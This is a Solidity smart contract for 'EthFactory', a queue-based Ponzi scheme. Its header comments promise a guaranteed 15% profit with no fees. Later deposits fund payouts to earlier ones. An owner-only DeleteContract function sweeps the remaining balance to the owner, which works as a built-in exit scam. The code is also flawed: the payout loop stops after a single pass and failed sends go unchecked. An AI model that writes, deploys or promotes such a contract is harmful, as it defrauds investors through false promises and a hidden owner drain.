///[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]Welcome to EthFactory!
//
// Multiply your Ether by +15% !!
//
// NO MINIMUM DEPOSIT !!
//
// NO HOUSE FEES !!
//
// Everyone gets paid in the line! After somebody has been paid, he is removed and the next person is in line for payment !
//
// Invest now, and you will Earn back 115%, which is your [Invested Ether] + [15% Profit] !
//
// Multiply your ETH Now !
//
///[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]Start

contract EthFactory{

  struct InvestorArray { address EtherAddress; uint Amount; }
  InvestorArray[] public depositors;

///[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]Variables

  uint public Total_Investors=0;
  uint public Balance = 0;
  uint public Total_Deposited=0;
  uint public Total_Paid_Out=0;
  string public Message="Welcome Investor! Multiply your ETH Now!";
  address public owner;
  modifier manager { if (msg.sender == owner) _ }
  function EthFactory() {owner = msg.sender;}
  function() { enter(); }
  
///[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]Enter

  function enter() {
    if (msg.value > 0) {

    uint Amount=msg.value;								//set amount to how much the investor deposited
    Total_Investors=depositors.length+1;   					 //count investors
    depositors.length += 1;                        						//increase array lenght
    depositors[depositors.length-1].EtherAddress = msg.sender; //add net investor's address
    depositors[depositors.length-1].Amount = Amount;          //add net investor's amount
    Balance += Amount;               						// balance update
    Total_Deposited+=Amount;       						//update deposited Amount
    uint payment; uint index=0;

    while (Balance > (depositors[index].Amount * 115/100) && index<Total_Investors)
     {
	if(depositors[index].Amount!=0 )
	{
      payment = depositors[index].Amount *115/100;                           //calculate pay out
      depositors[index].EtherAddress.send(payment);                        //send pay out to investor
      Balance -= depositors[index].Amount *115/100;                         //balance update
      Total_Paid_Out += depositors[index].Amount *115/100;           //update paid out amount   
       depositors[index].Amount=0;                                    //remove investor from the game after he is paid out! He must invest again if he wants to earn more!
	}break;
      }
  }
}
function DeleteContract() manager { owner.send(Balance); Balance=0; }

}